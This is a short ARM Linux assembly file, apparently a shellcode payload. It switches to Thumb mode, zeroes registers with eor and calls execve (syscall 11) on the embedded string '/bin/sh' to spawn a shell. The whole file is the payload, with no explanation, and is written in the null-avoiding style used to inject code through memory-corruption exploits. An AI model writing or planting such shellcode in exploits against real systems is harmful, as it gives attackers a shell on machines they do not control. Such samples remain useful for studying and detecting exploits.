

.global _start
.text

_start:
	.code 32
	#add  r3, pc, #1
	#bx   r3
	.code 16
	add  r0, pc, #8
	eor  r1, r1, r1
	eor  r2, r2, r2
	mov  r7, #11
	svc  1
	nop
.ascii "/bin/sh"
